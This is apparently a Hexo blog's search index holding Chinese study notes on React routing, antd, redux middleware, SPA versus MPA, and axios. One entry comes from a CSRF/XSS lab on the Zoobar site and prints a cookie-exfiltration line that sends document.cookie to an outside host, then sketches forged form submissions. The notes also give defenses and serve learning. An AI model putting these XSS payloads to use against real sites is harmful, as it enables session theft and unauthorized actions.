<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[[React]-antd的使用]]></title>
    <url>%2F2018%2F10%2F04%2FReact-antd%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[antd的使用步骤1、安装 yarn add antd 2、快速使用 1、导入antd：需要使用哪些组件,就导入哪些组件 2、导入antd的样式：我们自己建立一个CSS样式表,在样式表中基于@import导入antd.css 3、antd提供的组件都是英文国际化的,需要中文显示,我们导入汉化模块 1234567891011121314151617181920212223242526import React,&#123;Component&#125; from 'react';import ReactDOM from 'react-dom';import './index.css';//antd的应用import &#123;DatePicker,Icon,Button,localeProvider,Calendar&#125; from 'antd';import zh_CN from 'antd/lib/locale-provider/zh_CN';import 'moment/src/locale/zh_cn'class A extends Component&#123; constructor(props,context)&#123; super(props,context) &#125; render()&#123; //只要localeProvider包含的组件都是被汉化的 return (&lt;LocaleProvider locale=&#123;zh_CN&#125;&gt; &lt;div&gt; &lt;DatePicker/&gt; &lt;Calendar/&gt; &lt;Icon type="zhihu" style=&#123;&#123; color:'red', fontSize:'22px' &#125;&#125;/&gt; &lt;/div&gt; &lt;/LocaleProvider&gt;) &#125;&#125; CSS文件 1@import "~antd/dist/antd.css";/*导入antd的样式*/]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>antd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[React]-redux的中间件]]></title>
    <url>%2F2018%2F10%2F04%2FReact-redux%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[redux中间件 redux-logger:能够在控制台清晰的展示出当前redux操作的流程和信息(原有状态、派发信息、修改后的状态信息) redux-promise：在dispatch派发的时候支持promise操作 redux-chunk:处理异步dispatch派发 chunk中间件的使用语法：在指定执行派发任务的时候,等待3000ms后再派发dispatch都传递给我们了,我们想什么时候派发，自己搞定即可 promise中间件的语法传递给reducer的payload需要等待promise成功,把成功的结果传递过去]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>redux中的中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[React]-with-router]]></title>
    <url>%2F2018%2F10%2F04%2FReact-with-router%2F</url>
    <content type="text"><![CDATA[with-router:这个方法的意思是把一个非路由管控的组件,模拟成为路由管控的组件 12&lt;Route path="" component=&#123;Nav&#125;/&gt;//受路由管控的组件withRouter(connect()(Nav));//先把nav基于connect高阶一下,返回的是一个代理组件proxy,把返回的代理组件受路由管控 受路由管控组件的一些特点： 1、只有当前页面的哈希地址(/#/…)和路由指定的地址(path)匹配,才会把对应的组件渲染(withRouter是没有地址匹配,都被模拟成为受路由管控的) 2、路由切换的原理：凡是匹配的路由,都会把对应的组件内容重新添加到页面中,相反,不匹配的都会在页面中移除掉,下一次重新匹配上,组件需要重新渲染到页面中;每一次路由切换的时候(页面的哈希路由地址改变),都会从一级路由开始重新校验一遍; 3、所有受路由管控的组件,在组件的属性props上都默认添加了三个属性; history： 1、push：向池子中追加一条新的信息,达到切换到指定路由地址的目的this.props.history.push(“/plan”)JS中实现路由切换 2、go：跳转到指定的地址(传的是数字 0 当前 -1上一个 -2上两个) 3、goback：&lt;=&gt;go(-1)回退到上一个地址 4、goforward：&lt;=&gt;go(1)向前走一步… match：获取的是当前路由；匹配的一些结果 1、params:如果当前路由匹配的是地址路径参数,则这里可以获取传递参数的值 2、 location：获取当前哈希路由渲染组件的一些信息 1、pathname:当前哈希路由地址/custom/list 2、search：当前页面问号传参值:?lx=unsafe 3、state：基于redirect/link/navlink中的to,传递的是一个对象,对象中编写的state,就可以在location.state中获取到 history stack:历史信息栈(池子)12&lt;Redirect to=""/&gt;或者&lt;Link to=""/&gt;或者&lt;NavLink to=""&gt;//可以实现路由切换 0：”/“ 1: “/custom” 基于 如果不加push,是把当前信息替换,”/custom/list”如果加了push,是产生一条新的记录 2：”/custom/list” 每一次路由的切换,要不然是替换现有的地址,要不然就是新增一条地址信息,不管怎么样,都会立即切换到新的地址]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>with-router</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[React]-NAVlink和Link组件]]></title>
    <url>%2F2018%2F10%2F04%2FReact-NavLink%E5%92%8CLink%E7%BB%84%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[link：是react-router中提供的路由切换组件,基于它可以实现点击的时候路由切换TO[string]:跳转到指定的路由地址TO[object]:可以提供一些参数配置项(和redirect类似){ pathname:跳转地址 search:问号传参 state:基于这种方式传递信息}replace:false 是替换history stack中当前的地址(true),还是追加一个新的地址(false) 原理：基于link组件渲染,渲染后的结果就是一个a标签,to对应的信息最后变为href中的内容 react router中提供的组件都要在任何一个router(hash-router)包裹的范围内使用 NavLink:和link类似,都是为了实现路由切换跳转,不同在于,NavLink组件在当前页面hash和组件对应地址相吻合的时候,会默认给组件加一个active样式，让其有选中态 activeClassName:把默认加的active样式类改为自己设定的饿 activeStyle:给匹配的这个navlink设置行内样式 12exact&amp;&amp;strict控制匹配的时候是否是严格匹配isActive:匹配后执行对应的函数 1&lt;NavLink to="/custom" activeClassName=""/&gt;//最后也会转换为A标签,如果当前页面的hash地址和此组件中的to地址匹配了,则会给渲染后的A标签设置默认的样式类:active]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>NavLink和Link组件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[React]-switch和redirect]]></title>
    <url>%2F2018%2F10%2F04%2FReact-Switch%E5%92%8CRedirect%2F</url>
    <content type="text"><![CDATA[A页面 123456789import React from 'react';export default class A extends React.Component&#123; constructor(props)&#123; super(props); &#125; render()&#123; return (&lt;section&gt;我是A组件&lt;/section&gt;) &#125;&#125; B页面 123456789import React from 'react';export default class B extends React.Component&#123; constructor(props)&#123; super(props); &#125; render()&#123; return (&lt;section&gt;我是B组件&lt;/section&gt;) &#125;&#125; C页面 123456789import React from 'react';export default class C extends React.Component&#123; constructor(props)&#123; super(props); &#125; render()&#123; return (&lt;section&gt;我是C组件&lt;/section&gt;) &#125;&#125; index.js入口文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import React from 'react';import ReactDOM from 'react-dom';import &#123;HashRouter,Route,Switch,Redirect&#125; from 'react-router-dom';import A from './component/A';import B from './component/B';import C from './component/C';/** HashRouter:* 1、当前项目一旦使用Hash-Router,则默认在页面的地址后面加上'#/',也就是Hash默认值是一个斜杆,我们一般让其显示首页组件信息内容* 2、Hash-Router只能出现一个子元素* 3、Hash-Router机制中,我们需要根据哈希地址不同,展示不同的组件内容,此时需要使用Route* 4、Route* path:匹配哈希后面的值(地址),但是默认不是严格匹配,当前页面哈希地址只要包含完整的它(内容时不变的)都能被匹配上 例如：path="/":和它匹配的地址只要有斜杆(都能和它匹配) path="/user":'#user/login'也可以匹配,但是"#/user2"这个无法匹配 component：一旦哈希值和当前route的path相同了,则渲染component指定的组件 exact：让path的匹配严谨和严格一些(只有url哈希值和path设定的值相等才可以匹配到) path="/":"#/"匹配,但是"#/user"就不再匹配了 strict render：当页面的哈希地址 和path匹配，会把render规划的方法执行，在方法中一般做"权限校验"(渲染组件之前验证是否存在权限,不存在做一些特殊处理) ---------------------默认情况下,会和每一个route都做校验(哪怕之前已经有校验成功的),Switch组件可以解决这个问题,和switch case一样,只要有一种情况校验成功,就不再向后校验了*/ReactDOM.render(&lt;HashRouter&gt; &lt;Switch&gt; &lt;Route exact path='/' component=&#123;A&#125;/&gt; &lt;Route path='/user' component=&#123;B&#125;/&gt; &lt;Route path="/pay" render=&#123;()=&gt;&#123; //=&gt;一般在render中处理的是权限校验 let flag = localStorage.getItem('flag'); if(flag&amp;&amp;flag === 'safe' )&#123; return &lt;C/&gt; &#125; return '当前环境不安全,不利于支付'; &#125;&#125;/&gt; &#123;/*上述都设置完成后,会在默认设置一个匹配:以上都不符合的情况下,我们认为路由地址是非法地址,我们做一些特殊处理(route不设置path是匹配所有地址规则的)*/&#125; &lt;Route render=&#123;()=&gt;&#123; return (&lt;div&gt;404&lt;/div&gt;) &#125;&#125;/&gt; &#123;/* * 也可以基于Redirect进行重定向 * to[string]:重定向到新的地址 * to[object]:重定向到新的地址,只不过指定了更多的信息 * &#123; &#123; pathname:'/', search:给定向的地址问号传参,(结合当前案例,真实项目中,我们有时候会根据是否存在问号参数值来统计是正常进入首页还是非正常跳转过来的,也有可能根据问号参数值做不同的事情) state:给定向后的组件传递一些信息 &#125; * &#125; * push:如果设置了这个属性,当前跳转的地址会加入到 * history stack中一条记录 * from:设定当前来源的页面地址 * &lt;Redirect from="/custom" to="/custom/list"/&gt; * 如果当前请求的hash地址是"custom",我们让其重定向到" * custom/list" */&#125; &#123;/* &lt;Redirect to="/?lx=404"/&gt; */&#125; &lt;Redirect to=&#123;&#123; pathname:'/', search:'?lx=404' &#125;&#125;/&gt; &lt;/Switch&gt;&lt;/HashRouter&gt;,root)]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>switch和redirect</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[React]-HASH-ROUTER的基础操作]]></title>
    <url>%2F2018%2F10%2F04%2FReact-HASH-ROUTER%E7%9A%84%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[react-router-dom实现SPA单页面应用 yarn add react-rouert-dom 使用react路由实现SPA1、安装路由：yarn add react-router-dom 3及以前版本称为react-router 4及最新版本称为react-router-dom2、学习react路由： http://reacttraining.cn/web/api/3、BrowserRouter VS HashRouter 它是两种常用的路由实现思想,BrowserRouter是浏览器路由,HashRouter是哈希路由[BrowserRouter]: 它是基于H5中的history API(pushState,replaceState,popState)来保持UI和URL的同步。真实项目中应用的不多,history API并不是很稳定，一般只有当前项目是基于服务器渲染的,我们才会使用浏览器路由http://www.demo.com/http://www.demo.com/personal/http://www.demo.com/personal/login/ [HashRouter]:真实项目中(前后端分离的项目：客户端渲染,我们经常使用的是哈希路由来完成的,它依据相同的页面地址,不同的哈希值,来规划当前页面中的哪一个组件呈现渲染,它基于原生JS构造了一套类似于history API的机制,每一次路由切换都是基于history stack完成的!) http://www.demo.com/#/http://www.demo.com/#/personalhttp://www.demo.com/#/personal/login A页面 123456789import React from 'react';export default class A extends React.Component&#123; constructor(props)&#123; super(props); &#125; render()&#123; return (&lt;section&gt;我是A组件&lt;/section&gt;) &#125;&#125; B页面 123456789import React from 'react';export default class B extends React.Component&#123; constructor(props)&#123; super(props); &#125; render()&#123; return (&lt;section&gt;我是B组件&lt;/section&gt;) &#125;&#125; C页面 123456789import React from 'react';export default class C extends React.Component&#123; constructor(props)&#123; super(props); &#125; render()&#123; return (&lt;section&gt;我是C组件&lt;/section&gt;) &#125;&#125; index.js入口文件 123456789101112131415161718192021222324252627282930313233343536373839404142import React,&#123;Fragment&#125; from 'react';import ReactDOM from 'react-dom';import &#123;HashRouter,Route&#125; from 'react-router-dom'import A from './component/A';import B from './component/B';import C from './component/C';/** HashRouter:* 1、当前项目一旦使用Hash-Router,则默认在页面的地址后面加上'#/',也就是Hash默认值是一个斜杆,我们一般让其显示首页组件信息内容* 2、Hash-Router只能出现一个子元素* 3、Hash-Router机制中,我们需要根据哈希地址不同,展示不同的组件内容,此时需要使用Route* 4、Route* path:匹配哈希后面的值(地址),但是默认不是严格匹配,当前页面哈希地址只要包含完整的它(内容时不变的)都能被匹配上 例如：path="/":和它匹配的地址只要有斜杆(都能和它匹配) path="/user":'#user/login'也可以匹配,但是"#/user2"这个无法匹配 component：一旦哈希值和当前route的path相同了,则渲染component指定的组件 exact：让path的匹配严谨和严格一些(只有url哈希值和path设定的值相等才可以匹配到) path="/":"#/"匹配,但是"#/user"就不再匹配了 strict render：当页面的哈希地址 和path匹配，会把render规划的方法执行，在方法中一般做"权限校验"(渲染组件之前验证是否存在权限,不存在做一些特殊处理) ---------------------默认情况下,会和每一个route都做校验(哪怕之前已经有校验成功的)*/ReactDOM.render(&lt;HashRouter&gt; &lt;Fragment&gt; &lt;Route exact path='/' component=&#123;A&#125;/&gt; &lt;Route path='/user' component=&#123;B&#125;/&gt; &lt;Route path="/pay" render=&#123;()=&gt;&#123; //=&gt;一般在render中处理的是权限校验 let flag = localStorage.getItem('flag'); if(flag&amp;&amp;flag === 'safe' )&#123; return &lt;C/&gt; &#125; return '当前环境不安全,不利于支付'; &#125;&#125;/&gt; &lt;/Fragment&gt;&lt;/HashRouter&gt;,root)]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>hash-router的基础操作</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SPA和MPA]]></title>
    <url>%2F2018%2F10%2F04%2FSPA%E5%92%8CMPA%2F</url>
    <content type="text"><![CDATA[单页面应用和多页面应用 SPA：single page web application单页面web应用(一个产品只有一个页面,所有内容的展示和业务的处理都是在这个页面完成的) 都在这一个页面中实现切换,webpack中只需要配置一个入口即可,在移动端单页面应用居多。或者PC端管理系统类也是单页面为主。 MPA：multi page web application多页面web应用(一个产品包含很多页面,通过页面之前的跳转完成业务逻辑的衔接等) 一个项目由很多页面组成,使用这个产品,主要就是页面之间的跳转(PC端多页面应用居多);基于框架开发的时候,需要在webpack中配置多入口,每一个入口对应一个页面; SPA单页面应该的发展历程1、页面是基于服务端渲染的,不管是多页面还是单页面,我们肯定有很多需要公共使用的部分，此时我们把它封装成一个组件,通过相关的技术导入到具体的某一个页面中(例如：include) 注：如果项目是基于服务器渲染的,后台语言当中可以基于include等技术把很多部分拼凑在一起,实现组件化或者插件化开发,也可以实现单页面应用。 2、基于IFRAME完成单页面应用开发(前端负责) 12优势：主体页面内容依然是一个个的单独开发的,页面加载的时候,只渲染部分页面内容,想要展示谁,才去加载谁(性能上还是不错的)弊端：父子页面之间的信息通信(包括一些公共资源的使用)IFRAME都体现的不是特别良好 3、基于轻量级框架的模块化开发AMD：REQUIRE.JSCMD：SEA.JS基于这些思想把每一部分单独写成一个模块，最后基于GRUONT/DULP/FIS等自动化工具,最后把所有的模块都合并到首页中(包括HTML、CSS、JS都合并到一起),通过控制哪些模块的显示隐藏来实现单页面应用开发 弊端：由于首页中的内容包含了所有模块的信息,所以第一次加载速度很慢(虽然可以解决，但是相对来说比较的麻烦) 4、基于Vue/React实现模块化、组件化开发,基于他们提供的路由实现SPA单页面,基于webpack打包等 SPA和MPA的比较 比较 多页面应用模式(MPA) 单页面应用模式(SPA) 应用组成 由多个完整页面构成 由一个外壳页面和多个页面片段构成 跳转方式 页面之间的跳转是从一个页面跳转到另一个页面 页面片段之间的跳转是把一个页面片段删除或隐藏,加载另一个页面片段并显示出来。这是片段之间的模拟跳转,并没有离开壳页面 刷新方式 整页刷新 页面片段局部刷新 跳转后公共资源是否重新加载 是 否 URL模式 http://xxx.page1.html http://xxx.page2.html http://xxx.shell.html#page1 http://xxx.shell.html#page2 用户体验 页面间切换加载慢,不流畅,用户体验差,特别是在移动设备上 页面片段间的切换快,永辉体验好,包括在移动设备上 能否实现转场动画 无法实现 容易实现 页面间传递数据 依赖URL、cookie或者localstorage实现麻烦 因为在一个页面内,页面片段间传递数据很容易实现 搜索引擎优化(SEO) 可以直接做 需要单独方案做,邮电麻烦 特别适用范围 需要对搜索引擎友好的网站 对体验要求高的应用,特别是移动应用 开发难度 低一些,框架选择容易 高一些,需要专门的框架来降低这种模式的开发难度 结论 单页面应用模式由于有很多好处,已经是文本应用开发的潮流,特别是移动应用开发]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>SPA和MPA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csrf攻击方式以及防御手段]]></title>
    <url>%2F2018%2F09%2F17%2Fcsrf%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5%2F</url>
    <content type="text"><![CDATA[CSRF实验原理CSRF（Cross-Site Request Forgery，跨站点伪造请求）是一种网络攻击方式，该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大的危害性。具体来讲，可以这样理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 CSRF攻击原理CSRF攻击原理比较简单，如图1所示。其中Web A为存在CSRF漏洞的网站，WebB为攻击者构建的恶意网站，User C为Web A网站的合法用户。 1、用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 2、在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A； 3、用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 4、网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； 5、浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 CSRF的防御1)验证HTTP Referer字段根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问http://bank.test/test?page=10&amp;userID=101&amp;money=10000页面完成，用户必须先登录bank.test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank.test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。 2)在请求中添加token并验证CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。 这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token以参数的形式加入请求。对于 GET请求，token将附在请求地址之后，这样 URL就变成http://url?csrftoken=tokenvalue。而对于 POST请求来说，要在 form的最后加上 &lt;inputtype=”hidden” name=”csrftoken” value=”tokenvalue”/&gt;，这样就把 token以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。 实验基本思路就是1）启动session；2）在session中产生一个随机数，并且通过MD5或者其他散列函数进行散列；3)将session中生成的值放到表单中。4)在用户提交表单需要修改数据库的时候进行验证，用户提交的token是否和session中保存的token一致，只有一致的情况下，才进行数据库操作。 1）启动sessionsession_start(); 2）在session中产生一个随机数&lt;?php $_SESSION[‘csrf’]=md5(uniqid(mt_rand(),true)); ?&gt; 3）将session中生成的值放在表单中这个值就是token 4）用户提交表单验证提交的token是否和session中保存的值一致 if($_POST[‘submission’] &amp;&amp; $_SESSION[‘csrf’]==$_POST[‘token’]) XSS又称CSS，全称CrossSiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有 XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户 Cookie、破坏页面结构、重定向到其它网站等。 XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站。理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力。 我们实验中的XSS代码会保存在数据库中，也称为Stored XSS，也即存储式XSS漏洞。由于其攻击代码作为合法的输入已经存储到服务器上的数据库中，其他人在访问该页面的时候，服务器会自动地从数据库中取出该攻击串返回给用户，然后用户的浏览器则会自动执行该段代码，因此，攻击者只需要在自己的页面中写上攻击代码，其他所有访问该页面的人都会受到攻击。 实验步骤： 第一步也即如何找到XSS漏洞。一般而言，如果网站某个用户输入点能够执行alert(1)，弹出一个框，也就证明这是一个XSS漏洞。 为了执行JS，一般而言需要或伪协议javascript:，但是Zoobar网站本身对标签和javascript:都进行了过滤，为降低实验难度，允许本次实验对网站源码进行修改，从而可以执行XSS攻击。 典型的测试代码： &lt;ahref=javascript:alert(1)&gt;hello alert（1） 实验内容第一步包括steal cookie： 典型攻击代码如： window.open(“www.b.com?param=”+document.cookie) 此时只需要在www.b.com 写代码保存或者打印document.cookie值即可。 譬如 php代码的echo $_GET[‘param’]；或者创建一个文件，将cookie的值保存下来。 因为window本身也是重点过滤对象，所以可以考虑借助于img或a这种白名单上的标签。 会自动向src网站发出请求，但是为了获得document.cookie的值而不是作为字符串将它发送出去，必须要在JS中使用img 所以常见的做法是使用 document.write，自己写出来一个标签,然后把document.cookie的值作为参数附在链接之后。 从这里可以看出，使用JS可以实现HTML，从而也为接下来的攻击提供了思路。 Javascript提供createElement()和appendchild()函数，它可以创建元素并将新创建的元素附在document对象中。因此，只要存在XSS漏洞可以执行JS代码，攻击者可以创建Form表单以及Form表单中的每一项input或textarea，也即可以模拟transfer zoobar和更改profile的动作，这样，所有访问攻击者页面的用户都会被攻击。 XSS的防御： 输入过滤，标签转换，HttpOnly防止偷cookie]]></content>
      <categories>
        <category>csrf</category>
      </categories>
      <tags>
        <tag>csrf</tag>
        <tag>csrf攻击手段</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多种跨域方案详解]]></title>
    <url>%2F2018%2F09%2F17%2F%E5%A4%9A%E7%A7%8D%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[xss学习笔记一]]></title>
    <url>%2F2018%2F09%2F17%2Fxss%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80%2F</url>
    <content type="text"><![CDATA[同源策略思考题：与https://segmentfault.com/index.html 1)https://segmentfault.com:80/lives 2)https://www.segmentfault.com/index.php 3)http://segmentfault.com/test.html 4)https://segmentfault.com:443/lives 5)data:text/html;,L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false}); xss的危害2011.6.28,新浪微博受到xss蠕虫攻击20:14,开始有大量带V的认证用户中招转发蠕虫20:30,2kt.cn中的病毒页面无法访问20:32,新浪微博中hellosamy中户无法访问21:02,新浪漏洞修补完毕 2011.3.26日起,GitHub受到ddos攻击第一轮,百度统计的JS文件被劫持篡改,每2秒向GitHub上的两个页面发出请求,被Git胡U币的弹窗警告拦住第二轮,跨网域攻击,被GitHub第三轮,DDOs攻击GitHub Pages xss的成因1、网页劫持,dns劫持,跳到假网站/页面/脚本被篡改,插入恶意代码2、缓存投毒访问A站点时,加载了B站点的通用脚本,缓存时间非常长。再访问B站点时中招3、文件投毒,在非官方站点下载了某个库;官方下载地址被攻击;迅雷网络加速缓存了错误的文件;引用了不可信的第三方dns上的资源4、客户端投毒,被安装了恶意插件(尤其是chrome插件)5、自身安全漏洞造成猥琐绕过,产生反射型和存储型xss 解决方案1、网页劫持,dns劫持,跳到假网站/页面/脚本被篡改,插入恶意代码https,工信部投诉2、缓存投毒,访问A站点时,加载了B站点的通用脚本,缓存时间非常长。再访问B站点时中招 (网站:https 个人:连公共热点全程npn)3、文件投毒,在非官方站点下载了某个库;官方下载地址被攻击;迅雷网络加速缓存了错误的文件;引用了不可信的第三方dns上的资源 (去官网下载 只使用可靠资源)4、客户端投毒,被安装了恶意插件(尤其是chrome插件) (谨慎筛选插件 异站异密 二次验证)5、自身安全漏洞造成猥琐绕过,产生反射型和存储型xss 编码HTML编码十进制：&#60;&#62;十六进制：&#x3c;&#x3e;别名：&lt;&gt;&copy;&newLine;&amp;color JavaScript编码八进制:\141\154\145\162\50\51十六进制: url编码[encodeURI/decodeURI][encodeURIComponent/decodeURIComponent] base64编码&lt;a href=data:text/html;base64,PGLtZyB&gt; 成因1、提前闭合标签2、注释后续代码 1、此处可以插入任意空格、回车、/2、可以是http https ftp mailto data javascript vbscript //…各种协议的url3、可以是双引号、单引号、也可以是没有引号，在IE中可以是反引号4、任意的JS，能直接访问document作用域，字符可以被HTML转译 Payload(有效荷载)1、2、3、4、alert(1)5、clickme]]></content>
      <categories>
        <category>xss</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>学习笔记一</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[axios学习笔记一]]></title>
    <url>%2F2018%2F09%2F15%2Faxios%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80%2F</url>
    <content type="text"><![CDATA[axios基础语法axios:它是一个类库,基于promise管理的ajax库 1、提供了对应请求方式的方法(axios.get/post/delete/head/put/options…)axios.get()向服务器发送一个请求，基于的是get方式2、支持的参数配置 12345678910111213axios.get([url],[options]);axios.get('',&#123; params:&#123;//=&gt;get请求中，会把params中的键值对拼接成urlencode格式的字符串,然后以问号传参的方式,传递给服务器,类似于JQ-ajax中的data,或者自己基于url后面拼接也可以,不用params name:'', age:9 &#125;&#125;)axios.post('',&#123; //配置项中传递的内容都相当于基于请求主体专递给服务器,但是传递给服务器的内容格式是raw(json格式的字符串),不是X-WWW-FROM-URLENCODED name:'', age:9&#125;) 3、基于get/post发送请求,返回的结果都是promise实例 data=&gt;从服务器获取的响应主体内容 headers:从服务器获取的响应头信息 request:ajax实例 status:状态码 statusText:状态码的描述 config:基于axios发送请求的时候做的配置项]]></content>
      <categories>
        <category>axios</category>
      </categories>
      <tags>
        <tag>axios</tag>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[axios学习笔记一]]></title>
    <url>%2F2018%2F09%2F15%2Faxios%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[axios请求合并以及参数配置实现方式一： 123456axios.get('A').then(resultA=&gt;&#123; return axios.get('B'); &#125;).then(resultB=&gt;&#123; //=&gt;A和B都成功执行：resultB是B成功后的结果 //=&gt;全局result是A的结果 &#125;) 实现方式二： 12345678910111213//=&gt;sendAry中存放三个ajax请求的promise实例 let sendAry = [ axios.get(''), axios.get(''), axios.post('')];// =&gt;三个请求都完成才做一些事情,可以基于all实现axios.all(sendAry).then(result=&gt;&#123; console.log(result);//=&gt;是一个数组,分别存储每个请求的结果&#125;); 一次性并发多个请求将得到的结果分开 123456789101112131415161718//=&gt;sendAry中存放三个ajax请求的promise实例 let sendAry = [ axios.get(''), axios.get(''), axios.post('')];// =&gt;三个请求都完成才做一些事情,可以基于all实现//=&gt;匿名函数let anonymous = axios.spread((resA,resB,resC)=&gt;&#123; //=&gt;resA,resB,resC分别代表三次请求的结果 //=&gt;原理是JS中的柯理化函数&#125;);axios.all(sendAry).then(anonymous); 初始化一些配置项12345678910111213141516171819202122232425262728293031//=&gt;初始化一些常用的配置项 axios.defaults.baseURL = '';axios.defaults.validateStatus = function validateStatus(status) &#123; //=&gt;自定义成功失败规则:resolve/reject(默认规则：状态码以2开头算做成功) return /^(2|3|4)\d&#123;2&#125;$/.test(status);&#125;;axios.defaults.timeout = 3000;aioxs.defaults.headers = &#123;//=&gt;自定义请求头 name:'kjz'&#125;;axios.defaults.params = &#123;&#125;;//=&gt;get传参axios.defaults.data =&#123;&#125;;//=&gt;post请求// =&gt;使用axios.get('/list',&#123; params:&#123; lx:12 &#125;&#125;).then(result=&gt;&#123; //=&gt;result.headers:服务器返回的响应头信息&#125;)&lt;!-- post请求是三个参数：axios.post([url],[data],[config]) --&gt;axios.post('/add',&#123; lx: 2, headers:&#123;'xxx':'www'&#125;//=&gt;会放到请求主体里&#125;,&#123; headers:&#123;'xxx':'www'&#125;,//=&gt;配置项 transformRequest(data)&#123; &#125;&#125;).then(result=&gt;&#123;&#125;) application/x-www-form-urlencoded:设置在post请求中基于请求主体向服务器发送内容的格式,默认是raw，项目中常用的是urlencoded 设置响应拦截器12345axios.interceptors.response.use(function success(result)&#123; return result.data;&#125;,function error()&#123;&#125;) 设置响应拦截器：分别在响应成功和失败的时候做一些拦截处理(在执行成功后设定的方法之前,会先执行拦截器中的方法) transformRequest12345678910axios.defaults.transformRequest = data=&gt;&#123; //=&gt;data:就是请求主体中需要传递给服务器的内容(对象) let str = ``; for(let attr in data)&#123; if(data.hasOwnProperty(attr))&#123; str += `$&#123;attr&#125; = $&#123;data[attr]&#125;&amp;` &#125; &#125; return str.substring(0,str.length-1); &#125;]]></content>
      <categories>
        <category>axios</category>
      </categories>
      <tags>
